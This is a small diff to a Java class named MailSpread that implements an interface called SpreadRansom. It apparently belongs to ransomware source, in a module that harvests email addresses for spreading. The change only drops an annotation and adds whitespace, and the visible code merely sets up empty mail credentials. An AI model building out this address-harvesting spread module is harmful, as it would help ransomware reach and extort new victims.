@@ -7,11 +7,11 @@ import javax.mail.internet.*;
 
 public class MailSpread implements SpreadRansom {
 
-	@SuppressWarnings("null")
+	
 	public Collection<String> scanEmailAdress() {
 		Properties props = new Properties();
 		String host = "localhost";
-		String username = "";
+		String username = ""; 
 		String password = "";
 
 		// String provider = "pop3";
